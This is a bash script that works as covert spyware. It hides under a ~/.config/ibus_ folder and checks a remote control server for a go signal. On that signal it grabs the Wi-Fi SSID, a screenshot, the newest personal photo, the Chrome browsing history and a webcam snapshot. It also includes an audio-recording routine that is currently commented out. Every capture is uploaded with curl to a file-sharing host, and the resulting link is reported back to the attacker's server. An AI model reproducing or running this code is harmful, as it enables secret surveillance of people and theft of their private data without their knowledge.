#!/bin/bash
function dbgx(){
	echo "[*] $1";
}

function slpx(){
	sleep 5
}

HOME_="/home/$USER/"
HOME_2="/home/$USER/.config/ibus_/"
#IBUS_="/usr/local/sbin/ibus_/"
IBUS_="/home/$USER/.config/ibus_/"

function ssx(){
	#scrot
    output_file="ss.png"
    dbgx "ssx..."
    scrot "$IBUS_$output_file"
    dbgx "ssx saved to $output_file"
    cx "$output_file" "SS"
    slpx
    rm -f "$IBUS_$output_file"
}

function ssx_(){
    #imagemagick
    #export DISPLAY=:0.0
    DISPLAY=:0
    export DISPLAY
    #
    output_file="ss.png"
    dbgx "ssx..."
    import -window root "$IBUS_$output_file"
    dbgx "ssx saved to $output_file"
    cx "$output_file" "SS"
    slpx 
    rm -f "$IBUS_$output_file"
}

function ssx__(){
    #fbgrab #libpng-dev
    output_file="ss.png"
    dbgx "ssx..."
    fbgrab | convert - "$IBUS_$output_file"
    dbgx "ssx saved to $output_file"
    cx "$output_file" "SS"
    slpx
    rm -f "$IBUS_$output_file"
}

function ax(){
    #sox
    duration=30
    output_file="a.wav"
    #
    amixer set Capture cap
    #
    dbgx "ax started..."
    rec -q "$IBUS_$output_file" trim 0 "$duration"
    dbgx "ax stopped. Saved to $output_file"
    #
    cx "$output_file" "AX"
    slpx
    rm -f "$IBUS_$output_file"
    #
}

function ax_(){
    #arecord
    duration=30
    output_file="a.wav"
    #
    amixer set Capture cap
    #
    dbgx "ax started..."
    arecord -f cd -d $duration -t wav -r 44100 $IBUS_$output_file
    dbgx "ax stopped. Saved to $output_file"
    #
    cx "$output_file" "AX"
    slpx
    rm -f "$IBUS_$output_file"
    #
}

function PxNwx(){
    pictures_dir="$HOME_/Pictures"
    # Use the find command to locate all image files in the folder and its subdirectories
    images=$(find "$pictures_dir" -type f \( -iname \*.jpg -o -iname \*.jpeg -o -iname \*.png -o -iname \*.gif \))
    # Use the stat command to get the modification time of each image file and sort the list in reverse order
    sorted_images=$(echo "$images" | xargs stat --format '%Y %n' | sort -rn)
    # Extract the newest image file from the sorted list
    newest_image=$(echo "$sorted_images" | head -n 1 | awk '{print $2}')
    # Display the path to the newest image file
    dbgx "Newest image: $newest_image"
    output_file="px.png"
    cp "$newest_image" $IBUS_$output_file
    cx "$output_file" "PX"
    slpx
    rm -f "$IBUS_$output_file"
}
#Fswebcam
function WbCmx(){
	output_file="px.jpg"
	fswebcam "$IBUS_$output_file"
	dbgx "Fswebcam: as $output_file"
	cx "$output_file" "PX"
    	slpx
    	rm -f "$IBUS_$output_file"
}
#sqlite3
function Hstrx(){
    output_file="chrome_history.txt"
    tmp_chrome_history="$IBUS_/tmp_chrome_history.sqlite"
    # Define the path to the Chrome history database file
    chrome_history_file="$HOME_/.config/google-chrome/Default/History"
    # Copy the database file to a temporary location
    cp "$chrome_history_file" $tmp_chrome_history
    # Query the history database using SQLite and output the results to a text file
    sqlite3 -separator $'\t' $tmp_chrome_history "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), title, url FROM urls ORDER BY last_visit_time DESC;" > $IBUS_$output_file
    # Display the location of the output file
    dbgx "Chrome history extracted to $IBUS_$output_file"
    # Remove the temporary database file
    rm $tmp_chrome_history
    #
    cx "$output_file" "HX"
    slpx
    rm -f "$IBUS_$output_file"
}

function cx(){
    #OX2=`curl -k -T $IBUS_$1 https://oshi.at`
    #dbgx "OX2: $OX2";
    #cx_ "$OX2" "$2"
    #
    OX3=`curl -k --upload-file $IBUS_$1 https://free.keep.sh`
    dbgx "OX3: $OX3";
    cx_ "$OX3" "$2"
}

function cx_(){
    OX_=`curl -k -X POST -d "descr=$1&cat=$2" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
    dbgx "Descr: $1 Cat: $2 cx_OX:$OX_";
}

function mnx(){
    wifi_interface=$(iwconfig 2>&1 | grep "IEEE 802.11" | awk '{print $1}')  # Get the name of the wireless interface, if present
    eth_interface=$(ip link show | grep "state UP" | grep -v "lo:" | awk -F': ' '{print $2}')  # Get the name of the Ethernet interface, if present

    if [[ -n "$wifi_interface" ]]
    then
        dbgx "User is connected to WiFi using interface $wifi_interface"
        # Retrieve the SSID of the current wireless network
        SSID=$(iwgetid -r)

        # Check if the SSID variable contains a value
        if [[ -n "$SSID" ]]
        then
            dbgx "Current SSID: $SSID"
            #
            cx_ "$SSID" "SSID"
        else
            dbgx "No wireless network detected"
        fi
    elif [[ -n "$eth_interface" ]]
    then
        dbgx "User is connected to Ethernet using interface $eth_interface"
        #
        # Retrieve the name of the Ethernet connection
        eth_interface=$(ip -o link show | awk -F': ' '{print $2, $9}' | grep "state UP" | grep -v "lo:" | awk '{print $1}')

        # Check if the eth_interface variable contains a value
        if [[ -n "$eth_interface" ]]
        then
            dbgx "Name of Ethernet connection: $eth_interface"
             cx_ "$SSID" "SSID"
        else
            dbgx "No Ethernet connection detected"
        fi
	#
    else
        dbgx "User is not connected to WiFi or Ethernet"
    fi
    #
}

function px(){
    px_OX=`curl -k -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/px`
    if [[ "$px_OX" == "TRUE" ]]
    then
        dbgx "Run: $px_OX";
	#
        mnx
	#
    	ssx_ & PxNwx & Hstrx
	WbCmx
    	#ax_
	#
	exit 0
    else
        dbgx "Run: $px_OX";
        exit 1
    fi
}

px
